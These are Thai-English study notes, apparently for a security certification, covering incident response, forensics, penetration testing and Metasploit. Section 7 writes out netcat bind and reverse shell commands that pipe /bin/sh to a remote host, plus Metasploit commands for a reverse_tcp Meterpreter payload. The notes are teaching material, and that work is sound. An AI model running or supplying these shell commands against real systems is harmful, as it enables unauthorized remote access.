5. Incident Response & Digital Forensics 🔍

5.1 IR vs DR vs BCP

  • BCP (Business Continuity Plan) — ทำให้ business procedures resilient
  • DRP (Disaster Recovery Plan) — response & recovery สำหรับ major incidents
  • COOP — Continuity of Operation Planning (ภาครัฐ)

5.2 DR Sites

TypeDescription
Hot Siteพร้อมใช้ทันที มีอุปกรณ์+data ครบ
Warm Siteมีอุปกรณ์บางส่วน ต้อง config เพิ่ม
Cold Siteมีแค่พื้นที่ ต้องติดตั้งทุกอย่าง
Mobile Siteเคลื่อนย้ายได้ (portable data center)
Cloud/DRaaSใช้ cloud เป็น DR site (warm site config)

5.3 CIRT (Cyber Incident Response Team)

  • ชื่ออื่น: CERT, CSIRT, SOC
  • ต้องมี 24/7 availability + management authority
  • ไม่ใช่แค่ technical: ต้องมี Legal, HR, Marketing ด้วย

5.4 IR Process

Preparation → Identification → Containment → Eradication → Recovery → Lessons Learned
  • IR Plan — formal coordinated plan + Playbooks
  • Incident Categorization — หมวดหมู่, รูปแบบ, ลักษณะการโจมตี
  • Prioritization: Data integrity, Downtime, Economic impact, Scope, Detection/Recovery time
  • Communication Plan — stakeholder management, notification, law enforcement

5.5 Attack Frameworks

  • Cyber Kill Chain — ลำดับขั้นตอนการโจมตี
  • MITRE ATT&CK — database ของ TTPs (Tactics, Techniques, Procedures)

5.6 IR Exercises

  • Tabletop — facilitator นำเสนอ scenario (ไม่ใช้ live systems)
  • Walkthrough — responders demo response actions
  • Simulation — Red team ทำ simulated intrusion

5.7 SIEM & Trend Analysis

  • SIEM — correlation (static rules + threat intel + AI), retention สำหรับ evidence
  • Trend Analysis: frequency-based, volume-based, statistical deviation

5.8 Digital Forensics

  • เก็บและวิเคราะห์ data เป็น evidence
  • Key aspects: Tags, Chain of custody, Legal hold, Video, Interviews, Event logs, Reports
  • Counterintelligence — วิเคราะห์ adversary TTPs
  • Strategic Intelligence — inform risk management

5.9 Order of Volatility (สำคัญมาก!)

#SourceVolatility
1CPU registers & cacheสูงสุด (หายเร็วสุด)
2RAM (non-persistent memory)สูง
3Persistent storage (disk, pagefile, temp)ปานกลาง
4Remote logging & monitoring dataต่ำ
5Physical config & network topologyต่ำ
6Archival mediaต่ำสุด

5.10 Evidence Acquisition

  • Live Acquisition — เก็บขณะเครื่องเปิด (RAM, network connections, crypto keys)
  • Static Acquisition — shutdown แล้วเก็บ หรือ pull the plug
  • Disk Imaging — ใช้ forensic software (เช่น dd ใน Linux)
  • eDiscovery — identification & collection ของ electronically stored info

6. Security Assessment & Penetration Testing 🎯

6.1 Pentest Process

Planning → Reconnaissance → Scanning → Gaining Access → Maintaining Access → Covering Tracks → Analysis → Reporting

6.2 Pentest Types

TypeKnowledgeDetail
Black Boxไม่รู้อะไรเลยจำลอง external attacker; ต้องทำ recon เอง
White Boxรู้ทุกอย่างจำลอง insider; ข้าม recon ไปเลย
Grey Boxรู้บางส่วนจำลอง insider ที่รู้ไม่ครบ; ทำ recon บ้าง

6.3 Reconnaissance

  • เก็บข้อมูล: technology, personnel, organization structure
  • OSINT — ข้อมูลจากแหล่งสาธารณะ: social media, Whois, DNS, search engines
  • Social Engineering — exploit ความไว้วางใจของมนุษย์ (weakest link)

6.4 Scanning & Enumeration

  • Fingerprinting — ระบุ OS & services; Active (ส่ง crafted packets) vs Passive (sniff traffic)
  • Port Scanner — ใช้ TCP/UDP/ICMP หา open ports (ทั้งหมด 65,535 ports)
  • Vulnerability Scanner — หา known weaknesses (Nessus, Nikto, ZAP)
  • Protocol Analyzer — decode & analyze traffic (Wireshark)
  • Network Enumerator — หา users, groups, services โดยไม่ต้อง authenticate

6.5 Exploitation Tools

  • Password Crackers: Brute-force (ทุก combo), Dictionary (wordlist), Hybrid (ผสม)
  • Offline crack — ใช้ hash dump; Online crack — ผ่าน auth system โดยตรง
  • HTTP Interceptor — proxy ดักจับ HTTP traffic (POST data, headers)
  • Exploitation Framework — modularize exploit code; 1 exploit ส่งได้หลาย payload

7. Security Tools — Metasploit & Shells 💻

7.1 Bind Shell vs Reverse Shell

TypeHow it worksCommand
Bind ShellTarget เปิด port รอ → Attacker connect เข้าTarget: nc -lvp 4444 -e /bin/sh
Attacker: nc -nv [IP] 4444
Reverse ShellAttacker เปิด port รอ → Target connect กลับAttacker: nc -lvp 4444
Target: nc [IP] 4444 -e /bin/sh
  • Bind Shell ข้อเสีย: port เปิดตลอด → IDS ตรวจพบง่าย, firewall บล็อกได้, ข้าม NAT ไม่ได้
  • Reverse Shell นิยมกว่า เพราะ bypass firewall/NAT ได้

7.2 Metasploit Framework

  • Open-source penetration testing tool
  • 2 versions: Pro (web interface) vs MSFConsole (CLI)
  • เริ่มใช้งาน: msfconsole

7.3 Metasploit Workflow

Identify vulnerable service → Search exploit → Load & configure exploit → Load & configure payload → Run exploit → Get access

7.4 Key Commands

> show exploits          # แสดง exploits ทั้งหมด
> search [term]          # ค้นหา module
> use exploit/path/name   # เลือก exploit
> info                    # ดูข้อมูล exploit
> show options            # ดู options ที่ต้อง set
> set RHOSTS [IP]        # กำหนดเป้าหมาย
> show payloads           # แสดง payloads ที่ใช้ได้
> set payload [name]      # เลือก payload
> exploit                 # หรือ run — สั่งโจมตี

7.5 Payload

  • Payload = code ที่ทำงานหลัง exploit สำเร็จ
  • ทำได้: เปิด shell, reverse shell, สร้าง backdoor, privilege escalation, ควบคุมผ่าน Meterpreter
  • bind_tcp — target เปิด port รอ
  • reverse_tcp — target connect กลับ attacker (นิยมกว่า)

7.6 Meterpreter

  • Advanced shell รองรับ: Android, BSD, Java, Linux, PHP, Python, Windows
  • ตั้ง payload: set payload windows/meterpreter/reverse_tcp
  • ใช้ exploit/multi/handler สำหรับ multi-handler
  • หลาย sessions ได้พร้อมกัน; สลับด้วย background

7.8 Module Types

  • Auxiliary — info gathering, scanning, enumeration
  • Exploit — exploit code สำหรับ vulnerable services
  • Payload — code ที่รันหลัง exploit สำเร็จ
  • Post — post-exploitation modules
